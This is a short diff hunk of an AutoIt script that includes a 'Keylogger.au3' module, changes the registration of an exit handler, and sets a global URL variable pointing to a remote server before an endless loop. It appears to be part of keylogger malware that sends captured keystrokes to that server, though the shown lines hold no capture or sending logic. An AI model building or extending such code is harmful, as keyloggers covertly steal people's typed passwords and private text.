@@ -3,7 +3,8 @@
 
 #include <Keylogger.au3>
 
-OnAutoItExitRegister( "lastAction" )
+OnAutoItExitRegister("lastAction")
+OnAutoItExitUnRegister("lastAction")
 Global $MY_URL = "http://myserver.my/"
 
 While 1
